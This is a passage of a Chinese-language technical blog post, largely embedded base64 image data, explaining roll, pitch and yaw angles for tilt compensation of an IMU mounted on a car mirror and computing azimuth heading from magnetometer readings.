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xHexcveWI5jlHkQlCMWwbzcyiv8AasD327GLd2sfmkU9dLRczw2/nMPNnOXs0DbvNCOidtTUeelQAgEdRnZjKGV9bpCKoHb8/rVzTWzvHnNt+KM05RY9tUav8AAh8zHQzrd2HvO5hO7D3/AMAOu+4UX4tuB/qWy5hPeKMsWJsqG5YAXzhZa3wh4o+rKUvI7xkJO65pdA1SMnpKGbnRfI4h3DUAqoqaq7H5/aNfYXz+fc/wB6jtFBKDlwP2JSmW81dqgAUaS/zdXrLEfumfcPj0IuhGzq8HZ+fmL15JGl5d4SNoxFIghqLGWWUxkzMpnOVcF9oJdX48sZrWU89s33QWK6BgI5elsEENOM/ZidbJ1L/UKNvmeMBh8idaatduyGhPKQjKt8mhHQAjtdUat8+MNHQUxcex0g9pQ6u/pEfFghZTNGXvVEwaV0vukTCaCnWLlvvzLIHQ5OzkS0dh8cSwExUbBMM5oVlzq0fchA/sjj1hhBTsnDGmODJxC134e5BNVjKQD3onO+uNBZdtGfZ+3+AbEOSTSAAdQmkbA+0KvmOVVcgyQ8cFyk5Hky1G72O3ViiWZSQ3f/kH/9oADAMBAAIAAwAAABDzzzzzzzyjdzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzxlvTyCfHp/zzzzzzzzzzzzzhjjAHTzzzzzzzzzzz6uDbEoVzzD/Tzzzzzzzzyx6lMI3zzzzzzzzzzzyql6XczCER7zzzzzzzzzzyWfmXixTzzzzzzzzzzwi15Sjg1zzzzzzzxjzzzxjIFgzjBzzzzzzzzzzzxx0zczzzzzzzjFTEDjTQyK8RzSS6jzzzzzzzzzRf2nzzzzzzzyyM6YIO4WxzPBQzTzzzzzz19PCTSdYwnDzzzzzzzzwQMzwxyKq5QhzzzzzzUj9tJ5zxZRinDLzzzzzzxx7zzzxYEIDzzzzzzywsQG3zzxZTwyb17zzzzzzzzzzzw9+wjTLzzzzzz51w/wA88Yc8klrC088888888888888srhc6888888888888883bubc88888888888888LCYIR8888888888888888+M888888888888888eC+888888888888888888888888888888888888888888/8QAKxEBAAEDAQYGAwADAAAAAAAAAREAITFRMEFhcaGxECBAgZHB0eHwUGDx/9oACAEDAQE/ENi2P8CzFq0AnkBAucUieWp6UM39EkzQVg2mQWSsBsnhkv8Arp91B0RL2aYBnQ/VWmZjdOfIcUTjXnGY4ptLK3WmUQgaxhIUKwQ1G1yCyb6wGyeGI73s0AweM4c1Y/bwBrBE6D9BzZeVOFldpKEhKikhs6m5rBhg10pQWY+NvklkrAbJXXvd4RRn64rgOdRn+n99BzqeE6bg5GDYojub/N0D2a6M7ehyCyYpizLGd7FZ7vpz7sdTwKjwaLHvvea+xsRCQxUKSUTF4OiQT8Z51wE/jp5ZDV90IndbyToDmgfLVly/LsNPEFoHcgbNANzsvLJ5sHGgP5vEuy7h0LVM3hskAJn8J90rIH/R+virEAMyC/LNEQikMS82DdBUavBbbBKBV8EN1x9pzSKhz4EosMqwe/0S1jDiCx/GZPApc0rva697qySyVoBNniktx46e+OcURESUcJPx5UBWiAYdkgHAC1Ei2fsOX4tSzYQvxTeczPEp22Rh1NPovJpRFruMObl5EHGkiVjAWDkFj+v49e93hklkrQCbNVu+XoHs10J22cVby1A5+ZOlSNBvNl4z+XIqE8IZ5lp9+55Ove7xyCyb6lYE/p26CQ0AgxtAjwRSp8l2Mp6R5INsmKVkEJTZj0LJofRzFN0RUUn0IiKITuN+tS1qJZ/0/wD/xAAqEQEAAQMCBAYCAwEAAAAAAAABEQAhMUFRMGGhsRAgcYHB0UDhUJHw8f/aAAgBAgEBPxDgl2P4GIJk19KgiaB+HYbe5byTLuaFElqW1DP4TDNAbcRGhqjfmbJo9ySoAmgfh2Gp7kngxL/xUYEiXs0lIzy/VWGcaTnyKQcQrXNJJYQVAnIUCwQ1HFSYao35myaPxJUMXQPw7DU1ySeBYtXs0AY8Ssy7V6XsUAEHEmQYaBcw2ezU8AYKEosxx7ktUb8zZNHT0kqwbQPw7DbXJI11z2fATNPaOv6qy8FM3X83TPZroj8GShqjfmbJo/ElEmlGH2bOyanuWr7L63oVLd34Mh4SEZl71AHyiCVBDTyAJa5V/VKbrpw2/K1eqcaGFk2GmXspQRfQPw7J1yWxwRU1ztAhd9qmRDvV6v5C5w1i9FspBQ+BWa7VyM2+36oBBXXPZpGhqt30mjp6SUBH0D8OydclscKahTETFvKsEtAgKd+C0LVjioVEciuSHX9VifHrns+CNDVG/wBJo6eklAR9A/DsnXJbwnghHl6J7V0RRwligFy9AZnn/sUyUY8nXPZ8UaGq3fSaOnpJQRZLytZnkTrkmaHsrmUCyqEKhE3E7FHFSbNABB5J86eMHk5UX6R4l87/AEGVeQXaintci/OiUfgzLRjMtliRqGkoHRMZaMT/AKfwAVgzS5YN0wo7I1mWLxR+J1ZQDKqgAZgO1J39j0m1Tx5yGElRlMGG9i2pSrzJhb0T6rEmDWmNnaPRlrOm3LNKkWmMw2bLT6qa5qIs8cLpKRibiGGUMuhYuzU8y4SLm2X2TmWhZBJQZnZ31DBfKVsgBGHQGcWtIby5qDMscsMy63d9vwpd/wACBgbCh0atsrOefrR/F//EACsQAQACAQMCBQUBAAMBAAAAAAEAESExQVFhcUCBkaHwECAwscHRUOHxYP/aAAgBAQABPxDwLGX39Ia//AWS5f3MQYVXw0CmEyGj0gBcz+NYEMeXdamr6XLl/wDNsX4taxWhobZgvZNWB/AWpb3S4MiNHaLmcXK+hUtlt3bhh1hsWdENQQYLi3EsFZgh3qVbrV3U28eJs3cofPb7rl58O2TB9g6ibkt8qK1/U/8AGtKd8bNgZcvP0XMuM9/ko95VPupO2l04ikmAQYir0Ct5b4OM3ntfJR1lYFYKLFYNnAnUl6xpeYosMlUs85VHDtoLqsDVWqesD1McNknOUMnRm/jGcBqOwawF6IrUZE7avdEuLvA8J/eyRly5cFjh3nazpTYDUjMc6uwutNoWtCoiduDavVJbWRoD4tb1d7gvwy9MH2DhE3JaLcdqvweWtKI0Ddgd4fVhbUCxtjnyVpqquMCrlG/oLfeURWDQS6tXqwB3J2osMv01rFOmqednaZ0GI9RyCtq0Z2/FyH0HXqwMVUrxqvETe6M2Kos4QpPUYLWE9E/3eUVlip6F0C2CkGZodV6RIsR0hBklrPAdZ2Wie06kpqAQyLQIAtq7qZ5siL/KGhofQigPDrwweQdRNyXHTDar8HlrSnts1YH6dUGkY68Nx59O+ZQnsW/1H/uDZfg4GDzCKhBtMbXNDPEt+iIULx5uXM1CTj5pnOm7pDT7HWXGha0Bau0dObVtt6fp6kbuBVKsg7ly2/hjf7eAM+xmNk5Ibpv/AOD5SpoerHQfpxtFSX2cs5d9ZaADdgrGzAiWM8BuMpmmt6dZfU/eIuDn5zfyog5Hcx4pSSB7A6ibkukSG1X5P7Sm/wBsWH07yrK2lirOr+yIK3EYEsBMabS2Ic/piUKCjglfZZFOSBsUw3trP694NEhY/wDNefpBlQ5C151FgUeHQBXhqJo96XpLTyiW2XQ89GnqxaPaxvqrjO2dQiYg61LeKu76Q9IxcydRYiVDZ+kWx22HzRrrXkSqjR0Fond0501+wrR1DQBvMhNzr/LxfE1BrYX7YlxUN+tDk6+EaBAewdROJcNBaV+T01pTezbsDDP01J8Fx9wscjm5l41F7Ra6q/iI8vUj2pfK29P8Q08Thb2rp7FlG/SMK01tPUlFwN1C5VT++8ATpZ5HNDUVGs5X3uGw7Yj0IfQoJdKi/KBEEIMiMyvVA0LZ0N+v1GPe5Mn2IeDYhKFuA6ibkySwEq/J65pTWmasDBxFhnwXH1FzLg0msgHKsZMFi6svXz9GEXTOovGi+eOkEAAAoA0gdYfmuXL/AAk7anzKgbebuTD+voAEWP64DlOI7q0P13JUr6UPpjXeXfeFXWKvCUC4PXzt9iGhAUBt9G+5ZBVnnae1eGSUA+wdROJntiRX5vTWlI6JiwMdGfBcfUVXFDi1M9PTy9o5QeyAsava+8DTlHB5ECH53SPWUqGw8y40fSNrJqOiD+6MNPw0uUbymfcZ1JefP62ZUs7lrf8AjrKulJD7L6BGqA8AX2lOti3nmoI/V6S6jou8AAABQBUE3xdbE+2/tcEOgoODw6UiH2B1E4mQiJFX5vLWmFNO3YGfBcQNQ9ieBc2rZ3Ybcd9bNjvR0ZWYpzJymX9SiUSvys3ly5ohFhDOtVNcXDnyBUhRTm/euWD2FDohY+n3E2X0CYtjii+0VU38bEaJA0G1lW3zP7xf0QD1lrq7YLd5fcK0nm4bLggpV1s64KjnJeTf3ieuyZLN23NTBrBDrKNaMfI/Qy8y4wWUPCoSgPYHUTcl7QVxX5vRzTFdWXEpSmq9DMRgFpAfDnyioF7K7lb/ALdYHgXWDLaQ4ALVhdMscN6N4gFj2gBaxedYKBXtINMb+FJFcDLqaRiUVGTAD1GXVN9atm3bCeUvmCUFamgIQc4z93VimdbWPX/EdArqKHoVHhX5ze8oPJUjWZZn9DGM0TWwQZiiLcIi9KjLI3DKVIBxDBehVQP6009GOIM9h6xcwu4H+Ib1QC0LyLdfBv0KddvAcqy+R2DThs4Ht3jg9jN2ZtREpx7Qk2nVtlcVpW30NPAsJVQwC1bwjLLZCyVtmGwidHl3DAoJiBNjCJhoiur3LoHDAbmZrhAHcbsYOlDDgCiVsL9Nn+sCoLS9V4DdjQBuA561/NI6qD19SH/0+hvqrfKWJSjusVKvF01dggUKTg35H+yjD1jXvKBJ65/ZXkeaLzP8iCQUWJokERJmqmP+8w1qtN6yocQS4ayrLlX/AEQHsekn5bly/vsikvBXVA9Rg7ay4wcWOOR9XqQ3L4pHd5erBmjnYEsJxMszzJfF6OzBrWbsEHEvwDKlPxlpa5YeKvUZMNOqnRjo/edEZqzEeUGSA0do5ijBWY+vVqmC92gtZvdYWqHpDVR9IXGPaBxhi3UtIepi1uJNnQntIRNyJE7Ru+igMa2W7qHGvafzmftjvvQf2Y2FupTetDNLEMR7n4upKPWH5V1+g3DX7VxK9G+FHdxNn4c7D5HeVat+yv4KIGJqT4LiEEqCsDqJuTLpYSXxejswKRm7B828NUqRmpRQjEoV2VQUyZdKvpCU/ciGQpkAadYspF6/0YFs+PWBafP3gGhfHmAafN6wLSUD1v3P7ZoDd7fua7X1gvCH7j2QeScjuT2M7lsyzDo1lTV5xR/NnvDvsy9T1iocgagsR1ImQbl7m76nuThA+quj3935L+hoUc0QQ9SMfEcqCAzPQlsbT4MutdFhVIt1nZ4ejn6LlwUJ6Edur0JbpDQzuavq9pbAOrTqtP3AMr6ak+C4gLhH1QrA6ibkstAKw+L0dmBZszYPm0uXnweib8UDcE5APQeZZQSzVU6tcmMdZUDAFH4WaDs+IguvEFeLLI8l8/Qlmg94AElWunOLT8zR8ofSqqAQoWiOzA73g32bHl+NlR5Vm2q6YVJqUDkTDCQMOGkqcOHeJbZ6M3odaK79UL/VEIjsnEVCGapteNODTazE0L1bG+DZ/wDYCRrRQHVgXgfczc/XWBDWXrpm72O8Ob9DAcAaQ0h9dSfBcfUGSKBYHUTiZnOCQ+L0dmG8M3YPm0NfB6JQ6k1fL49yH43zvOZkrh7uThjIKqt3p/19OImqBRTpJiutL4ro9T8rGVsYQtXiLKfPS4vrIwCyRNNtVOmY2zc1WAcgYwKbSpdAaDSr2pV9aqP0gtjdQ0ASscy+NYmLkYogujH9s6LONLc1/DXsTiHIFeV1Xqyjj7tSfBcfYGbVAsDqJuTVkqAH4vJ2Zd0tNg+bfQ8JRx+I8PxvPn9WFjagWJ1mrix56pz7iJZCGpvNQ8mK2rNnf/8AU6kzyMOn5nXeUpvLirhbA6l6eUEBYiDchm8c1CO3Q4AZ3vT1YV1LUHra6DwRIyKpY3R+vVvBx9+pPguPtFFqAsDqJuTUfhAH4vJ2YGa7Nif7MSnUFu32zLBvNs8umrB1qD4tWqa1TSViPXZxWjl+orRuy6nD2Ms1hVApNxNmK6vUlZgs8W17NR1vmD+dviyATLdcEbNtld22CvB4wW1EWjQNYd2xGA0S94zbarytNJuWHD1iRuwQdHPo9GHxHkk6GzG2OktS6F1+/UnwXH3AyVQLEdROJrSeAHwejswvn2GbuOvQ4OriWglqh4fjl8ggH4oLZkGxkPWZwaVneivHukQibUYeHfvqRHXigOR36oGyjTWE4ThHMQCROp6Hffhv6XB/I0Dd4TJcSjcGnV2zUi6myDRKLBdWLK+gWjUCxOpF69e9+uQ/A1JSYiVA40MNfsuLiFF2FbsDytPbmqkTGwgKomp0024YI0gw4HXz2rW5TRbszY05c55eiLpyYstatBwx8sPWVtatBZhg345lk8pjN05ORwwQEGwLXRTW37is06KpoWAmcGtS4M69SfGIpsyqgzV3r5xDFYrYymnjR8/yJmBn8jKWw+0T8FG/heN683aZZLZ1eqeOOkt+CwU3E37wFo5VdDMRdnpToMFMQ0AGANiM6JoQHEr7WPPki53lZUWHqlh4+olAwOqwWxuvo3E1fV7axibVlQ2tQfWnuQkIAoAoCU41qsxjL2afIzxdTjo1WN+Yr5VLlzbw9H2unRKrsEJY1DDAU7lH/aGZz+IEquXLaAKn28HC9XH8hWBLWX9FYcE0ZM9o0sf6tZSw3k2FPWWFChkvJDXx11lg1eAN10CHdYsCNmNnn0oy0SUaF4DQl2QR4tHW6d/+pR7QpWlwtunTN7kJe5A1CC5LbebAX3WrIKlVV2VpBpiFhFQVyYb1EbKwyYXFWXcDMyL8PYMWrLHjLDbtXCVCxc0bC26a+uZS9Wm66uvnjpAKwYAaIJhNmV/ywY4oa50mBc8VVyWy3bNTSS3k8uqpar0YNoU0+zohbGeuYgoFEOoPjXSUQOlOorpt7vMNI50I2A/kThxQFdV5sobo3jOSom9sF5/S2WivAgGL3jBjO3YhMUCLdqyXMnCAXRVr3olmIbYaVRGxorEEPQWs0y1BhQFlOj2W8WNumGucePYg96Ar0sXR7RKOqArSmnbHEaLKaVdKqvrrKoINgq0HGTowgAABoHjXSLaxRsV1oySrnZKw8lhg6Kq+gYjyL2uTe34Q/wCFZUr6Hjq+lSv/AJX/2Q==" alt="引用自：http://silverwind1982.pixnet.net/blog/post/258069682-%E4%B8%89%E7%B6%AD%E6%97%8B%E8%BD%89%E8%A1%A8%E7%A4%BA%E6%B3%95---%E6%AD%90%E6%8B%89%E8%A7%92%E3%80%81%E6%97%8B%E8%BD%89%E7%9F%A9%E9%99%A3%E3%80%81%E6%97%8B%E8%BD%89%E5%90%91"></p>
<p><strong><em> roll </em></strong><br>roll一般指的是繞x軸旋轉的角度<br>就是往x軸看過去，yz平面上旋轉的角度</p>
<p><strong><em> pitch </em></strong><br>pitch一般指的是繞y軸旋轉的角度</p>
<p><strong><em> yaw </em></strong><br>yaw一般指的是繞z軸旋轉的角度</p>
<p><br><br>對於一個三維剛體的旋轉來說，roll、pitch、yaw三個角度可以定義出該剛體的旋轉情形</p>
<p>以我們的環境來說，後照鏡(IMU)因為每次掛在車上時的角度都不同，所以我們用”目前後照鏡的座標系” 與 “地球座標系”之間的角度差異來定義我們IMU傾斜的幅度<br>而兩個座標系的角度差異即可用roll、pitch、yaw來表示</p>
<p>例如：水平擺放的IMU轉了roll角，再轉了pitch，最後轉yaw角，變成目前掛在後照鏡上的狀態(傾斜角度)<br>這個我們稱為<strong><em>傾角補償</em></strong></p>
<p>而這裡旋轉的先後是有差別的，先旋轉roll或先旋轉pitch，最後的結果有可能不同<br>所以可能有不同組(roll, pitch, yaw)旋轉可以對應到同一個物體的傾斜狀態</p>
<h2 id="u65B9_u4F4D_u89D2"><a href="#u65B9_u4F4D_u89D2" class="headerlink" title="方位角"></a>方位角</h2><p>又稱為<strong><em>Azimuth</em></strong><br>這裏的方位角定義為車子在水平面上的行進方向與磁北在水平面上的投影的夾角<br>此方位角即可拿來作為車子行進方向(heading)的依據<br><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f7/Azimuth-Altitude_schematic.svg/350px-Azimuth-Altitude_schematic.svg.png" alt="圖片取自wiki"></p>
<p>仔細觀察即可發現，Azimuth其實就是yaw角(相對於水平面來說)</p>
<p>若IMU為水平擺放，且磁力計x軸為車行進方向，則Azimuth的值即為<code>arctan(my/mx)</code><br>(mx: 磁力計x軸測得之數值 ; my: 磁力計y軸測得之數值)<br><img src="data:image/png;base64,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